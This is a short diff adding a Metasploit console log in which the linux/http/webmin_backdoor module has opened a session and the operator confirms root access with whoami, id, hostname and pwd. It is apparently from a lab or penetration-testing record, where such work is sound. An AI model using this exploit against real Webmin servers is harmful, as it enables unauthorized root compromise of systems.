@@ -1,0 +1,11 @@
+msf6 exploit(linux/http/webmin_backdoor) > sessions -i 1
+[*] Starting interaction with 1...
+
+whoami
+root
+hostname
+ed6f84232187
+id
+uid=0(root) gid=0(root) groups=0(root)
+pwd
+/usr/share/webmin/acl
